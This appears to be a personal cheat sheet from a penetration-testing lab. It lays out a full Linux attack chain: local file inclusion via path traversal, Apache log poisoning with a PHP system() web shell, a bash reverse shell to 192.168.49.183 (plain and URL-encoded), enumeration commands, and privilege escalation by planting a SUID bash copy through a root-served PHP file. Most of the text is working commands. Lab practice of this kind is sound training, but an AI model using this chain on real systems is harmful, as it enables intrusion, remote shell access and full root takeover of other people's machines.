

FTP
quote PASV
ls -lsa


http://URL/index.php?book=../../../../etc/passwd

Log Poisoning

Once we identify the web tech as PHP

book=../../../../var/www/html/index.php
if this is loaded, we have a LFI

we go to /var/log/apache2/access.log

nc -nv $IP 80
...
GET /<?php system($_GET['cmd']); ?>
...
will show bad request, we dont mind.

now we use 
/var/log/apache2/access.log&cmd=id
/var/log/apache2/access.log&cmd=

we take
bash -i >& /dev/tcp/192.168.49.183/443 0>&1
but wrap it to avoid the & delimiter
bash -c 'bash -i >& /dev/tcp/192.168.49.183/443 0>&1'
URL encode
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.183%2F443%200%3E%261%27%0A

we check

World Writables
/tmp
/var/tmp
/dev/shm

Check for services running off Loopback adapter
netstat -tunlp
look for 127.0.0.1

ps aux |grep -i 'root' --color=auto

Check for exotic mounts or extended file attributes: 
cat /etc/fstab
mount
getcap -r / 2>/dev/null

ls -lsa /etc/passwd

/tmp/sv is a SUID with an index.php

Edit index.php (or similar file being served by the root PHP process): 
nano index.php

Add malicious PHP code to copy /bin/bash to /var/tmp/dash and set SUID permissions:
<?php echo "OffSec Says Hello."; system("cp /bin/bash /var/tmp/dash; chmod u+s /var/tmp/dash"); ?>

ls -la /var/tmp/dash (look for s in permissions, e.g., -rwsr-xr-x)

we need to view or process the webpage.
Access the local web server to execute the modified index.php: 
curl http://127.0.0.1:57/

Execute the SUID binary to gain root:
/var/tmp/dash -p 








